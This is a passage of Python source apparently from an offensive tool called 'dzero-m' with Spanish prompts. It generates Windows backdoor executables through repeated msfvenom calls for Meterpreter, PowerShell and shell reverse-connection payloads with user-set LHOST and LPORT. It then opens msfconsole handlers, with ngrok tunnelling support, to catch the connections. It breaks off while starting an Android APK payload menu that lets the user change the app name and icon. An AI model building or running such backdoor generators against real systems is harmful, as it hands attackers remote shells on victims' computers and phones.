				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/x64/meterpreter_reverse_http LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/x64/meterpreter_reverse_http; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()						

			elif pay == '02':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/x64/meterpreter_reverse_https LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/x64/meterpreter_reverse_https; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '03':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/x64/meterpreter_reverse_tcp; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '04':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '05':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/x64/powershell_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/powershell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/x64/powershell_reverse_tcp; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '06':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/x64/shell_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/x64/shell_reverse_tcp; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '07':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/meterpreter_reverse_http LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/meterpreter_reverse_http; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '08':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/meterpreter_reverse_https LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/meterpreter_reverse_https; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '09':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/meterpreter_reverse_tcp; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '10':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/meterpreter/reverse_tcp; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '11':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter/reverse_tcp_dns; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/meterpreter/reverse_tcp_dns; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '12':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/metsvc_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/metsvc_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/metsvc_reverse_tcp; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '13':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/powershell_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/powershell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/powershell_reverse_tcp; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '14':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/shell_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/shell_reverse_tcp; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			else:
				print("\n{}[X] OPCION INVALIDA\n".format(RED))
				time.sleep(3)
				pause("{}Presione cualquier tecla para continuar...".format(GREEN))
				os.system('clear')
				main()	

		elif sys == '03':
			print ('{0}\n [*] {1}Select Payload:\n'.format(DEFAULT, GREEN))
			print ('{0}[01]{1} android/meterpreter_reverse_http'.format(WHITE, YELLOW))
			print ('{0}[02]{1} android/meterpreter_reverse_https'.format(WHITE, YELLOW))
			print ('{0}[03]{1} android/meterpreter_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[04]{1} android/meterpreter/reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[05]{1} android/shell/reverse_http'.format(WHITE, YELLOW))
			print ('{0}[06]{1} android/shell/reverse_https'.format(WHITE, YELLOW))
			print ('{0}[07]{1} android/shell/reverse_tcp'.format(WHITE, YELLOW))

			pay = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
			pay = pay.zfill(2)

			if pay == '01':
				print ('{0}\n [*] {1}Select APK Type:\n'.format(DEFAULT, GREEN))
				print ('{0}[01]{1} APK MSF'.format(WHITE, YELLOW))
				print ('{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW))
				
				a = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
				a = a.zfill(2)
				
				if a == '01':
					run_network()
					LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
					LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
					while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
						break
					else:
						Tk().withdraw()
						icon = filedialog.askopenfilename(title = "dzero-m - SELECT ICON PNG",filetypes = (("png files","*.png"),("all files","*.*")))
						print("\n{0}ICON: {1}".format(YELLOW, icon))
						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))					
